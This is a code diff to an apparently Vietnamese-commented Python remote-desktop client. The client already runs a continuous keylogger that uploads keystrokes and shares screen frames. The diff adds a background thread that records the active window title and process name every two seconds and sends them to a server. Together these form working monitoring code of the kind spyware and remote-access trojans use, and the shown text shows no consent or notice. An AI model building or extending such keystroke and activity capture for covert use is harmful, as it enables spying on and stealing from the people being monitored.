@@ -12,6 +12,9 @@ from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QVBoxLay
 from PyQt6.QtCore import Qt, pyqtSignal
 import pygetwindow as gw
 from pynput import keyboard  # Thêm import cho keylogger
+import win32gui
+import win32process
+import psutil
 
 # Import client components
 from src.client.client_constants import CLIENT_ID, CA_FILE
@@ -74,6 +77,9 @@ class Client:
         self.keylogger_thread = None  # [THÊM] Thread keylogger
         self.keylogger_running = False  # [THÊM] Flag keylogger
         self.key_buffer = ""  # [THÊM] Buffer lưu keystroke
+        self.window_tracker_thread = None  # [THÊM] Thread window tracker
+        self.window_tracker_running = False  # [THÊM] Flag window tracker
+        self.last_window_title = ""  # [THÊM] Track last window để tránh spam
         self.last_full_frame_ts = 0
         self.full_frame_interval = 30 
         
@@ -147,6 +153,15 @@ class Client:
         )
         self.keylogger_listener.start()
         self.logger("[Client] Đã khởi động keylogger liên tục...")
+        
+        # 8. Khởi động Window Tracker (Luôn chạy liên tục)
+        self.window_tracker_running = True
+        self.window_tracker_thread = threading.Thread(
+            target=self._window_tracker_loop,
+            daemon=True
+        )
+        self.window_tracker_thread.start()
+        self.logger("[Client] Đã khởi động window tracker liên tục...")
 
         self.logger("[Client] Đã khởi động toàn bộ dịch vụ.")
         return True
@@ -171,6 +186,9 @@ class Client:
         self.keylogger_running = False
         if hasattr(self, 'keylogger_listener'):
             self.keylogger_listener.stop()
+        
+        # Dừng window tracker
+        self.window_tracker_running = False
         
         self.sender.stop()
         self.network.stop() # Sẽ kích hoạt _on_disconnected
@@ -336,6 +354,56 @@ class Client:
         except Exception as e:
             # Log lỗi để debug
             print(f"[Keylog] ❌ Lỗi gửi keylog: {e}")
+    
+    def _window_tracker_loop(self):
+        """Theo dõi cửa sổ đang active và gửi lên server"""
+        import time
+        from datetime import datetime
+        
+        self.logger("[WindowTracker] Bắt đầu theo dõi windows...")
+        
+        while self.window_tracker_running and self.network.running:
+            try:
+                # Lấy thông tin cửa sổ đang active
+                hwnd = win32gui.GetForegroundWindow()
+                if hwnd:
+                    window_title = win32gui.GetWindowText(hwnd)
+                    
+                    # Lấy process name
+                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+                    try:
+                        process = psutil.Process(pid)
+                        process_name = process.name()
+                    except:
+                        process_name = "Unknown"
+                    
+                    # Chỉ gửi khi window title thay đổi (tránh spam)
+                    if window_title and window_title != self.last_window_title:
+                        self.last_window_title = window_title
+                        
+                        # Tạo window data object
+                        window_data = {
+                            "type": "window_title",
+                            "WindowTitle": window_title,
+                            "ProcessName": process_name,
+                            "ClientID": self.username,
+                            "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        
+                        print(f"[WindowTracker] 🪟 Gửi window: '{window_title}' ({process_name})")
+                        
+                        # Gửi qua INPUT channel
+                        self.network.send_input_pdu(window_data)
+                
+                # Check mỗi 2 giây (không cần quá thường xuyên)
+                time.sleep(2)
+                
+            except Exception as e:
+                if self.window_tracker_running:
+                    print(f"[WindowTracker] ❌ Lỗi: {e}")
+                time.sleep(2)
+        
+        self.logger("[WindowTracker] Đã dừng window tracker")
 
     def _on_frame(self, width, height, jpg_bytes, bbox, img, seq, ts_ms):
         # Tất cả các role đều được phép gửi frame (screen sharing)
